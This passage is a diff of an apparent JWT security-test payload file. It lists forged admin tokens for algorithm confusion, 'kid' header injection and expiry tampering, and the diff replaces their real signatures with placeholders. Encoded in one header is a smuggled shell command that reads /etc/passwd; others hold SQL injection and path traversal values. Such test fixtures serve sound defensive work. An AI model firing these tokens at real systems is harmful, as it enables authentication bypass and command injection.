@@ -51,28 +51,28 @@ payloads:
   - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
   
   # Algorithm confusion: RS256→HS384 variant
-  - "eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  - "eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
   
   # Algorithm confusion: RS256→HS512 variant
-  - "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  - "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
   
-  # kid header injection: path traversal to /dev/null — signed with empty key
-  - "eyJhbGciOiAiSFMyNTYiLCAia2lkIjogIi4uLy4uL2Rldi9udWxsIiwgInR5cCI6ICJKV1QifQ.eyJzdWIiOiAiYWRtaW4iLCAiaWF0IjogMTUxNjIzOTAyMiwgImV4cCI6IDE5MTYyMzkwMjIsICJyb2xlIjogImFkbWluIn0.UdPZsMEUouirVq0HOzKE7a-HrVcxW8HwS9js5AHeoF4"
+  # kid header injection: path traversal to /dev/null — dummy/placeholder signature
+  - "eyJhbGciOiAiSFMyNTYiLCAia2lkIjogIi4uLy4uL2Rldi9udWxsIiwgInR5cCI6ICJKV1QifQ.eyJzdWIiOiAiYWRtaW4iLCAiaWF0IjogMTUxNjIzOTAyMiwgImV4cCI6IDE5MTYyMzkwMjIsICJyb2xlIjogImFkbWluIn0.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
   
-  # kid header injection: SQL injection payload — signed with empty key  
+  # kid header injection: SQL injection payload — dummy/placeholder signature  
   - "eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEyMycgT1IgJzEnPScxJy0tIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
   
-  # kid header injection: command injection — signed with empty key
+  # kid header injection: command injection — dummy/placeholder signature
   - "eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleTsgY2F0IC9ldGMvcGFzc3dkIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
   
-  # kid header injection: null byte (%00 instead of %p0) — signed with empty key
+  # kid header injection: null byte (%00) — dummy/placeholder signature
   - "eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEyMyUwMCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
   
-  # Expiry manipulation: exp set to year 2100 (4102444800) — signed with empty key
-  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiYWRtaW4iLCAiaWF0IjogMTUxNjIzOTAyMiwgImV4cCI6IDQxMDI0NDQ4MDAsICJyb2xlIjogImFkbWluIn0.EpMCLQtk0xm9JZiUaBcR5YCDCYosfS8PFeKD3q7K0Pc"
+  # Expiry manipulation: exp set to year 2100 (4102444800) — dummy/placeholder signature
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiYWRtaW4iLCAiaWF0IjogMTUxNjIzOTAyMiwgImV4cCI6IDQxMDI0NDQ4MDAsICJyb2xlIjogImFkbWluIn0.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
   
-  # Expiry manipulation: exp field removed entirely — signed with empty key
-  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiYWRtaW4iLCAiaWF0IjogMTUxNjIzOTAyMiwgInJvbGUiOiAiYWRtaW4ifQ.9PvMCXF9eXdS-e4hdfMupLKSG_kdJVt20Tj7Z_Txw2I"
+  # Expiry manipulation: exp field removed entirely — dummy/placeholder signature
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiYWRtaW4iLCAiaWF0IjogMTUxNjIzOTAyMiwgInJvbGUiOiAiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
   
   # Expiry manipulation: negative exp value
   - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjotMSwicm9sZSI6ImFkbWluIn0.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
